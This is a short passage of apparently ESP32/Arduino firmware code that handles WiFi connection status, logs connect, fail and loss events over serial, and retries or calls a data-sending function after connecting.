                wifi_connecting = false;
                Serial.println("[WiFi] Connected! IP: " + WiFi.localIP().toString());
                delay(2000);
                sendWiFiData();
            } else if (WiFi.status() == WL_CONNECT_FAILED) {
                wifi_connecting = false;
                Serial.println("[WiFi] Connection failed");
            }
        }
        
        if (wifi_connected && WiFi.status() != WL_CONNECTED) {
            Serial.println("[WiFi] Connection lost!");
            wifi_connected = false;
            tryConnectWiFi();
        }
    }
}